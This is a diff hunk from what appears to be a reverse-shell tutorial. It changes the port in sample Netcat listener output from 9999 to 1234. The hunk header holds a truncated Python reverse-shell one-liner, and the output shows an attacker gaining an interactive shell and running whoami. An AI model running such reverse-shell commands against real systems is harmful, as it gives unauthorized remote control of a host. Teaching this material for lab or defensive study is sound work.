@@ -41,7 +41,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 Once the reverse shell command is executed, the attacker’s terminal running Netcat will establish a connection, giving you an interactive shell:
 
 ```bash
-listening on [any] 9999 ...
+listening on [any] 1234 ...
 connect to [IP_ADDRESS] from (UNKNOWN) [IP_ADDRESS] PORT
 /bin/sh: 0: can't access tty; job control turned off
 $ whoami
